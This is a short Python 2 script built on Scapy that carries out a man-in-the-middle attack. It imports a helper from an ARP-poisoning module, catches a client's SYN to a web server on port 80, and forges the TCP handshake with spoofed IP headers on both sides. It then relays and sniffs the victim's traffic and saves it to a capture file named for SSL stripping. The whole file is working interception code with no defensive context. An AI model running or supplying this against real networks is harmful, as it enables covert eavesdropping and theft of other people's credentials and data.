from scapy.all import *
from arppoison import gethostmac

def forward(p):
    if p[IP].src == ipToSpoof:
        send(ipLayerC / p[TCP], iface = ifa)
    elif p[IP].src == ipVictim:
        send(ipLayerS / p[TCP], iface = ifa)
    return p.summary()

def isnotownpacket(p):
    return p[Ether].src != attackerMac
        
def startforwarding(ipServer, ifa, timeOut):
    global ipToSpoof, ipVictim, ipLayerS, ipLayerC, attackerMac
    attackerMac = gethostmac(ifa)
    ipToSpoof = ipServer
    print "Listening as " + ipToSpoof

    # SYN from client
    a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof, iface = ifa)
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # SYN to server
    ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
    tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq, window = a[0].window)
    answer = sr1(ipLayerS / tcpLayer, iface = ifa)

    # SYNACK to client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = answer.ack, window = answer.window)
    send(ipLayerC / synAck, iface = ifa)
    print "Handshake completed"
    print "---------------------"

    packets = sniff(filter = "tcp", lfilter = isnotownpacket, prn = forward, iface = ifa, timeout = timeOut)
    #save sniffed packets
    wrpcap('sslstrip.pcap', packets)
